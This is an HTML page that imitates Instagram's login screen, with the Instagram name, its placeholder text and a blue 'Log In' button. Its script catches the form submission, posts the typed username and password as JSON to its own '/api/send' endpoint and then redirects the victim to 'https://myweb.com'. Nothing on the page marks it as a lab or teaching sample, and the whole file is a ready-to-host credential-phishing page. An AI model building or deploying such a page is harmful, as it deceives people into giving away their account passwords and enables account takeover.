<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>
  <style>
    body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #fafafa; }
    .box { background: #fff; padding: 30px; border: 1px solid #dbdbdb; width: 320px; text-align: center; }
    h2 { font-family: 'Billabong', cursive; font-size: 40px; margin: 10px 0 20px; }
    input { width: 100%; padding: 10px; margin: 6px 0; box-sizing: border-box; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; }
    .show-btn { display: none; background: none; border: none; color: #262626; font-weight: 600; cursor: pointer; margin-bottom: 8px; }
    button[type="submit"] { width: 100%; padding: 8px; background: #0095f6; color: #fff; border: none; border-radius: 5px; cursor: pointer; font-weight: 600; margin-top: 8px; }
    button[type="submit"]:disabled { background: #b2dffc; cursor: not-allowed; }
  </style>
</head>
<body>
  <div class="box">
    <h2>Instagram</h2>
    <form id="loginForm">
      <input type="text" id="username" placeholder="Phone number, username, or email" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="button" class="show-btn" id="showBtn">Show</button>
      <button type="submit" id="submitBtn" disabled>Log In</button>
    </form>
  </div>

  <script>
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const submitBtn = document.getElementById('submitBtn');
    const showBtn = document.getElementById('showBtn');

    function checkInputs() {
      submitBtn.disabled = !(usernameInput.value.length > 0 && passwordInput.value.length > 5);
      showBtn.style.display = passwordInput.value.length > 0 ? 'block' : 'none';
    }
    usernameInput.addEventListener('input', checkInputs);
    passwordInput.addEventListener('input', checkInputs);

    showBtn.addEventListener('click', () => {
      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        showBtn.textContent = 'Hide';
      } else {
        passwordInput.type = 'password';
        showBtn.textContent = 'Show';
      }
    });

    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const username = usernameInput.value;
      const password = passwordInput.value;
      try {
        const res = await fetch('/api/send', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, password })
        });
        if (res.ok) window.location.href = 'https://myweb.com';
      } catch (err) { console.error(err); }
    });
  </script>
</body>
</html>
